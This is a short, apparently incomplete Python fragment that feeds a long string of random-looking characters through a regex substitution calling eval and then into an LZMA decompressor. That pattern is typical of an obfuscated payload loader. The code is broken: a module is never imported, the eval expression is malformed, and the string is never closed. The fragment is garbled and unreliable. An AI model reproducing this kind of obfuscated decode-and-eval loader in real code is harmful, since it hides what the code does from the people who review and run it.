from lzma import LZMADecompressor
LZMADecompressor().decompress(re.compile(r'\\x\w{2}').sub(lambda x: chr(eval("0x" + x.group(0) + "l")), ("""epyl0n,i'g_\:6l]mL(E`V7)x@,P\V5\Y<E>/oM2?FW/1@C;e^G</% Qz')R.o_]!=X@TJTZO41ITRK$[t<K994h58$!y8_,Q=4ljK&DN<(-Y'8WLyK&)M#;[%i,o99z*0@Dg\KStB9(\s1%M4Qy8/P-#9_B/Of\p<`RZoCi'N''TtTAs$=gW1m8?HpJ9kAo)Y%mW7<8[F(;!m*!y@)5V7i^(0So\V7D &B<!dZ
